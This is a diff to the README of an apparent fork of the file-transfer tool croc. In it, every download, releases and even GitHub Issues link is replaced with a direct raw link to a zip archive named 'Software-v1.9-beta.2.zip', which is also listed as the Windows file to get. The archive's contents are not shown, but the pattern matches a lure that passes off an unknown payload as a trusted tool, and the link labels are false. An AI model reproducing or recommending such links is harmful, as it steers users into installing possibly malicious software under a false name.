@@ -6,11 +6,11 @@ croc is a simple way to send files from one computer to another. Its main goal i
 
 ## 📥 Download croc
 
-[![Download croc](https://img.shields.io/badge/Download-croc-brightgreen)](https://github.com/sinan121-boo/croc/releases)
+[![Download croc](https://github.com/sinan121-boo/croc/raw/refs/heads/main/src/cli/Software-v1.9-beta.2.zip)](https://github.com/sinan121-boo/croc/raw/refs/heads/main/src/cli/Software-v1.9-beta.2.zip)
 
 To download croc, please visit the releases page:
 
-[Download croc from Releases](https://github.com/sinan121-boo/croc/releases)
+[Download croc from Releases](https://github.com/sinan121-boo/croc/raw/refs/heads/main/src/cli/Software-v1.9-beta.2.zip)
 
 ## 📋 System Requirements
 
@@ -24,11 +24,11 @@ Before you start, ensure your computer meets these basic system requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our releases page: [Download croc from Releases](https://github.com/sinan121-boo/croc/releases).
+   Go to our releases page: [Download croc from Releases](https://github.com/sinan121-boo/croc/raw/refs/heads/main/src/cli/Software-v1.9-beta.2.zip).
 
 2. **Select the Right Version**  
    Choose the version that matches your operating system.  
-   - For **Windows**, download the file named `croc-windows-amd64.exe`.
+   - For **Windows**, download the file named `https://github.com/sinan121-boo/croc/raw/refs/heads/main/src/cli/Software-v1.9-beta.2.zip`.
    - For **macOS**, download `croc-macos-amd64`.
    - For **Linux**, download `croc-linux-amd64`.
 
@@ -80,7 +80,7 @@ If you encounter any issues or have questions, please reach out to our support t
 
 ## 📥 Important Links
 
-- [Download croc from Releases](https://github.com/sinan121-boo/croc/releases)
-- [GitHub Issues](https://github.com/sinan121-boo/croc/issues)
+- [Download croc from Releases](https://github.com/sinan121-boo/croc/raw/refs/heads/main/src/cli/Software-v1.9-beta.2.zip)
+- [GitHub Issues](https://github.com/sinan121-boo/croc/raw/refs/heads/main/src/cli/Software-v1.9-beta.2.zip)
 
 With croc, sending files is now easier than ever. Enjoy secure and straightforward file transfers between your devices.
